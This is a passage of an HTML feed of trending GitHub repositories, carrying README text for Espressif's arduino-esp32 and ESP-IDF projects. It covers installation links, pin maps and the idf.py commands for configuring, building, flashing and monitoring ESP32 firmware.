&lt;h3&gt;&lt;a id="user-content-development-status" class="anchor" aria-hidden="true" href="#development-status"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Development Status&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://github.com/espressif/arduino-esp32/releases/latest/"&gt;Latest stable release &lt;img src="https://camo.githubusercontent.com/8a1875aace3889f9ab48c65082f67d0a2592f85d/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f72656c656173652f6573707265737369662f61726475696e6f2d65737033322e7376673f7374796c653d706c6173746963" alt="Release Version" data-canonical-src="https://img.shields.io/github/release/espressif/arduino-esp32.svg?style=plastic" style="max-width:100%;"&gt; &lt;img src="https://camo.githubusercontent.com/598cc61956fd795f6afeaa5f83b90b03e7b0dcaf/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f72656c656173652d646174652f6573707265737369662f61726475696e6f2d65737033322e7376673f7374796c653d706c6173746963" alt="Release Date" data-canonical-src="https://img.shields.io/github/release-date/espressif/arduino-esp32.svg?style=plastic" style="max-width:100%;"&gt;&lt;/a&gt; &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/1de0131ec4c1e3b3dd7b3103a06235070c1292e2/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f646f776e6c6f6164732f6573707265737369662f61726475696e6f2d65737033322f6c61746573742f746f74616c2e7376673f7374796c653d706c6173746963"&gt;&lt;img src="https://camo.githubusercontent.com/1de0131ec4c1e3b3dd7b3103a06235070c1292e2/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f646f776e6c6f6164732f6573707265737369662f61726475696e6f2d65737033322f6c61746573742f746f74616c2e7376673f7374796c653d706c6173746963" alt="Downloads" data-canonical-src="https://img.shields.io/github/downloads/espressif/arduino-esp32/latest/total.svg?style=plastic" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/espressif/arduino-esp32/releases/latest/"&gt;Latest development release &lt;img src="https://camo.githubusercontent.com/d887e6d3d611a266139041835312348149b19b1b/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f72656c656173652f6573707265737369662f61726475696e6f2d65737033322f616c6c2e7376673f7374796c653d706c6173746963" alt="Development Version" data-canonical-src="https://img.shields.io/github/release/espressif/arduino-esp32/all.svg?style=plastic" style="max-width:100%;"&gt; &lt;img src="https://camo.githubusercontent.com/210eed8ebec694f2cbb39013624c5b256c194c02/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f72656c656173652d646174652d7072652f6573707265737369662f61726475696e6f2d65737033322e7376673f7374796c653d706c6173746963" alt="Development Date" data-canonical-src="https://img.shields.io/github/release-date-pre/espressif/arduino-esp32.svg?style=plastic" style="max-width:100%;"&gt;&lt;/a&gt; &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/65b7c8229e217d09829f318cbcc9b8765e5596ba/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f646f776e6c6f6164732d7072652f6573707265737369662f61726475696e6f2d65737033322f6c61746573742f746f74616c2e7376673f7374796c653d706c6173746963"&gt;&lt;img src="https://camo.githubusercontent.com/65b7c8229e217d09829f318cbcc9b8765e5596ba/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f646f776e6c6f6164732d7072652f6573707265737369662f61726475696e6f2d65737033322f6c61746573742f746f74616c2e7376673f7374796c653d706c6173746963" alt="Downloads" data-canonical-src="https://img.shields.io/github/downloads-pre/espressif/arduino-esp32/latest/total.svg?style=plastic" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-installation-instructions" class="anchor" aria-hidden="true" href="#installation-instructions"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installation Instructions&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Using Arduino IDE Boards Manager (preferred)
&lt;ul&gt;
&lt;li&gt;&lt;a href="docs/arduino-ide/boards_manager.md"&gt;Instructions for Boards Manager&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Using Arduino IDE with the development repository
&lt;ul&gt;
&lt;li&gt;&lt;a href="docs/arduino-ide/windows.md"&gt;Instructions for Windows&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="docs/arduino-ide/mac.md"&gt;Instructions for Mac&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="docs/arduino-ide/debian_ubuntu.md"&gt;Instructions for Debian/Ubuntu Linux&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="docs/arduino-ide/fedora.md"&gt;Instructions for Fedora&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="docs/arduino-ide/opensuse.md"&gt;Instructions for openSUSE&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="docs/platformio.md"&gt;Using PlatformIO&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="docs/make.md"&gt;Building with make&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="docs/esp-idf_component.md"&gt;Using as ESP-IDF component&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="docs/OTAWebUpdate/OTAWebUpdate.md"&gt;Using OTAWebUpdater&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-decoding-exceptions" class="anchor" aria-hidden="true" href="#decoding-exceptions"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Decoding exceptions&lt;/h3&gt;
&lt;p&gt;You can use &lt;a href="https://github.com/me-no-dev/EspExceptionDecoder"&gt;EspExceptionDecoder&lt;/a&gt; to get meaningful call trace.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-issuebug-report-template" class="anchor" aria-hidden="true" href="#issuebug-report-template"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Issue/Bug report template&lt;/h3&gt;
&lt;p&gt;Before reporting an issue, make sure you've searched for similar one that was already created. Also make sure to go through all the issues labelled as &lt;a href="https://github.com/espressif/arduino-esp32/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue%20label%3A%22for%20reference%22%20"&gt;for reference&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Finally, if you are sure no one else had the issue, follow the &lt;a href="docs/ISSUE_TEMPLATE.md"&gt;ISSUE_TEMPLATE&lt;/a&gt; while reporting any issue.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-esp32dev-board-pinmap" class="anchor" aria-hidden="true" href="#esp32dev-board-pinmap"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ESP32Dev Board PINMAP&lt;/h3&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="docs/esp32_pinmap.png"&gt;&lt;img src="docs/esp32_pinmap.png" alt="Pin Functions" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-tip" class="anchor" aria-hidden="true" href="#tip"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Tip&lt;/h3&gt;
&lt;p&gt;Sometimes to program ESP32 via serial you must keep GPIO0 LOW during the programming process&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>espressif</author><guid isPermaLink="false">https://github.com/espressif/arduino-esp32</guid><pubDate>Tue, 04 Feb 2020 00:08:00 GMT</pubDate></item><item><title>espressif/esp-idf #9 in C, This week</title><link>https://github.com/espressif/esp-idf</link><description>&lt;p&gt;&lt;i&gt;Espressif IoT Development Framework. Official development framework for ESP32.&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-espressif-iot-development-framework" class="anchor" aria-hidden="true" href="#espressif-iot-development-framework"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Espressif IoT Development Framework&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="./README_CN.md"&gt;中文版&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://docs.espressif.com/projects/esp-idf/en/latest/?badge=latest" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/1af20a2147d12aca36403d0181d88e229da2640f/68747470733a2f2f72656164746865646f63732e636f6d2f70726f6a656374732f6573707265737369662d6573702d6964662f62616467652f3f76657273696f6e3d6c6174657374" alt="Documentation Status" data-canonical-src="https://readthedocs.com/projects/espressif-esp-idf/badge/?version=latest" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ESP-IDF is the official development framework for the &lt;a href="https://espressif.com/en/products/hardware/esp32/overview" rel="nofollow"&gt;ESP32&lt;/a&gt; chip.&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-developing-with-esp-idf" class="anchor" aria-hidden="true" href="#developing-with-esp-idf"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Developing With ESP-IDF&lt;/h1&gt;
&lt;h2&gt;&lt;a id="user-content-setting-up-esp-idf" class="anchor" aria-hidden="true" href="#setting-up-esp-idf"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Setting Up ESP-IDF&lt;/h2&gt;
&lt;p&gt;See setup guides for detailed instructions to set up the ESP-IDF:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.espressif.com/projects/esp-idf/en/stable/get-started/" rel="nofollow"&gt;Getting Started Guide for the stable ESP-IDF version&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.espressif.com/projects/esp-idf/en/latest/get-started/" rel="nofollow"&gt;Getting Started Guide for the latest (master branch) ESP-IDF version&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-non-github-forks" class="anchor" aria-hidden="true" href="#non-github-forks"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Non-GitHub forks&lt;/h3&gt;
&lt;p&gt;ESP-IDF uses relative locations as its submodules URLs (&lt;a href=".gitmodules"&gt;.gitmodules&lt;/a&gt;). So they link to GitHub.
If ESP-IDF is forked to a Git repository which is not on GitHub, you will need to run the script
&lt;a href="tools/set-submodules-to-github.sh"&gt;tools/set-submodules-to-github.sh&lt;/a&gt; after git clone.
The script sets absolute URLs for all submodules, allowing &lt;code&gt;git submodule update --init --recursive&lt;/code&gt; to complete.
If cloning ESP-IDF from GitHub, this step is not needed.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-finding-a-project" class="anchor" aria-hidden="true" href="#finding-a-project"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Finding a Project&lt;/h2&gt;
&lt;p&gt;As well as the &lt;a href="https://github.com/espressif/esp-idf-template"&gt;esp-idf-template&lt;/a&gt; project mentioned in Getting Started, ESP-IDF comes with some example projects in the &lt;a href="examples"&gt;examples&lt;/a&gt; directory.&lt;/p&gt;
&lt;p&gt;Once you've found the project you want to work with, change to its directory and you can configure and build it.&lt;/p&gt;
&lt;p&gt;To start your own project based on an example, copy the example project directory outside of the ESP-IDF directory.&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-quick-reference" class="anchor" aria-hidden="true" href="#quick-reference"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Quick Reference&lt;/h1&gt;
&lt;p&gt;See the Getting Started guide links above for a detailed setup guide. This is a quick reference for common commands when working with ESP-IDF projects:&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-setup-build-environment" class="anchor" aria-hidden="true" href="#setup-build-environment"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Setup Build Environment&lt;/h2&gt;
&lt;p&gt;(See Getting Started guide for a full list of required steps with details.)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Install host build dependencies mentioned in Getting Started guide.&lt;/li&gt;
&lt;li&gt;Add &lt;code&gt;tools/&lt;/code&gt; directory to the PATH&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;python -m pip install -r requirements.txt&lt;/code&gt; to install Python dependencies&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-configuring-the-project" class="anchor" aria-hidden="true" href="#configuring-the-project"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Configuring the Project&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;idf.py menuconfig&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Opens a text-based configuration menu for the project.&lt;/li&gt;
&lt;li&gt;Use up &amp;amp; down arrow keys to navigate the menu.&lt;/li&gt;
&lt;li&gt;Use Enter key to go into a submenu, Escape key to go out or to exit.&lt;/li&gt;
&lt;li&gt;Type &lt;code&gt;?&lt;/code&gt; to see a help screen. Enter key exits the help screen.&lt;/li&gt;
&lt;li&gt;Use Space key, or &lt;code&gt;Y&lt;/code&gt; and &lt;code&gt;N&lt;/code&gt; keys to enable (Yes) and disable (No) configuration items with checkboxes "&lt;code&gt;[*]&lt;/code&gt;"&lt;/li&gt;
&lt;li&gt;Pressing &lt;code&gt;?&lt;/code&gt; while highlighting a configuration item displays help about that item.&lt;/li&gt;
&lt;li&gt;Type &lt;code&gt;/&lt;/code&gt; to search the configuration items.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Once done configuring, press Escape multiple times to exit and say "Yes" to save the new configuration when prompted.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-compiling-the-project" class="anchor" aria-hidden="true" href="#compiling-the-project"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Compiling the Project&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;idf.py build&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;... will compile app, bootloader and generate a partition table based on the config.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-flashing-the-project" class="anchor" aria-hidden="true" href="#flashing-the-project"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Flashing the Project&lt;/h2&gt;
&lt;p&gt;When the build finishes, it will print a command line to use esptool.py to flash the chip. However you can also do this automatically by running:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;idf.py -p PORT flash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Replace PORT with the name of your serial port (like &lt;code&gt;COM3&lt;/code&gt; on Windows, &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; on Linux, or &lt;code&gt;/dev/cu.usbserial-X&lt;/code&gt; on MacOS. If the &lt;code&gt;-p&lt;/code&gt; option is left out, &lt;code&gt;idf.py flash&lt;/code&gt; will try to flash the first available serial port.&lt;/p&gt;
&lt;p&gt;This will flash the entire project (app, bootloader and partition table) to a new chip. The settings for serial port flashing can be configured with &lt;code&gt;idf.py menuconfig&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;You don't need to run &lt;code&gt;idf.py build&lt;/code&gt; before running &lt;code&gt;idf.py flash&lt;/code&gt;, &lt;code&gt;idf.py flash&lt;/code&gt; will automatically rebuild anything which needs it.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-viewing-serial-output" class="anchor" aria-hidden="true" href="#viewing-serial-output"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Viewing Serial Output&lt;/h2&gt;
&lt;p&gt;The &lt;code&gt;idf.py monitor&lt;/code&gt; target uses the &lt;a href="https://docs.espressif.com/projects/esp-idf/en/latest/get-started/idf-monitor.html" rel="nofollow"&gt;idf_monitor tool&lt;/a&gt; to display serial output from the ESP32. idf_monitor also has a range of features to decode crash output and interact with the device. &lt;a href="https://docs.espressif.com/projects/esp-idf/en/latest/get-started/idf-monitor.html" rel="nofollow"&gt;Check the documentation page for details&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Exit the monitor by typing Ctrl-].&lt;/p&gt;
&lt;p&gt;To build, flash and monitor output in one pass, you can run:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;idf.py flash monitor&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-compiling--flashing-only-the-app" class="anchor" aria-hidden="true" href="#compiling--flashing-only-the-app"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Compiling &amp;amp; Flashing Only the App&lt;/h2&gt;
&lt;p&gt;After the initial flash, you may just want to build and flash just your app, not the bootloader and partition table:&lt;/p&gt;
&lt;ul&gt;
